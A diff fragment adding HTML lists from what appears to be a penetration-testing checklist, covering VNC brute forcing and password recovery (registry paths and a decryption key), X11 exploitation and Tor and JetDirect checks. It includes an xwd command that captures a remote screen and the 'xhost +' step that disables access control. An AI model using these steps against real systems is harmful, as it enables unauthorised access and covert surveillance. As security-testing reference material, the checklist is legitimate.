+<li>phone.conf</li>
+<li>sip_notify.conf</li>
+<li>&lt;Ethernet address&gt;.cfg</li>
+<li>000000000000.cfg</li>
+<li>phone1.cfg</li>
+<li>sip.cfg etc. etc.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>VNC port 5900^ open</li>
+<li style="list-style-type: none"><ul><li>VNC Enumeration</li>
+<li style="list-style-type: none"><ul><li>Scans</li>
+<li style="list-style-type: none"><ul><li>5900^ for direct access.5800 for HTTP access.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>VNC Brute Force</li>
+<li style="list-style-type: none"><ul><li>Password Attacks</li>
+<li style="list-style-type: none"><ul><li>Remote</li>
+<li style="list-style-type: none"><ul><li>Password Guess</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.phenoelit.de/vncrack/">vncrack</a></li>
+</ul>
+</li>
+<li>Password Crack</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.phenoelit.de/vncrack/">vncrack</a></li>
+<li>Packet Capture</li>
+<li style="list-style-type: none"><ul><li>Phosshttp://www.phenoelit.de/phoss</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Local</li>
+<li style="list-style-type: none"><ul><li>Registry Locations</li>
+<li style="list-style-type: none"><ul><li>\HKEY_CURRENT_USER\Software\ORL\WinVNC3</li>
+<li>\HKEY_USERS\.DEFAULT\Software\ORL\WinVNC3</li>
+</ul>
+</li>
+<li>Decryption Key</li>
+<li style="list-style-type: none"><ul><li>0x238210763578887</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Exmine Configuration Files</li>
+<li style="list-style-type: none"><ul><li>.vnc</li>
+<li>/etc/vnc/config</li>
+<li>$HOME/.vnc/config</li>
+<li>/etc/sysconfig/vncservers</li>
+<li>/etc/vnc.conf</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>X11 port 6000^ open</li>
+<li style="list-style-type: none"><ul><li>X11 Enumeration</li>
+<li style="list-style-type: none"><ul><li>List open windows</li>
+<li>Authentication Method</li>
+<li style="list-style-type: none"><ul><li>Xauth</li>
+<li>Xhost</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>X11 Exploitation</li>
+<li style="list-style-type: none"><ul><li>xwd</li>
+<li style="list-style-type: none"><ul><li>xwd -display 192.168.0.1:0 -root -out 192.168.0.1.xpm</li>
+</ul>
+</li>
+<li>Keystrokes</li>
+<li style="list-style-type: none"><ul><li>Received</li>
+<li>Transmitted</li>
+</ul>
+</li>
+<li>Screenshots</li>
+<li>xhost +</li>
+</ul>
+</li>
+<li>Examine Configuration Files</li>
+<li style="list-style-type: none"><ul><li>/etc/Xn.hosts</li>
+<li>/usr/lib/X11/xdm</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>Search through all files for the command "xhost +" or "/usr/bin/X11/xhost +"</li>
+<li></li>
+</ul>
+</li>
+<li>/usr/lib/X11/xdm/xsession</li>
+<li>/usr/lib/X11/xdm/xsession-remote</li>
+<li>/usr/lib/X11/xdm/xsession.0</li>
+<li>/usr/lib/X11/xdm/xdm-config</li>
+<li style="list-style-type: none"><ul><li>DisplayManager*authorize:on</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Tor Port 9001, 9030 open</li>
+<li style="list-style-type: none"><ul><li>Tor Node Checker</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.ippages.com/?ip">Ip Pages</a></li>
+<li><a href="http://www.as3344.net/is-tor/">Kewlio.net</a></li>
+</ul>
+</li>
+<li>nmap NSE script</li>
+</ul>
+</li>
+<li>Jet Direct 9100 open</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.phenoelit.de/fr/tools.html">hijetta</a></li>
+</ul>
+</li>
+</ul>
+&nbsp;</body></html>
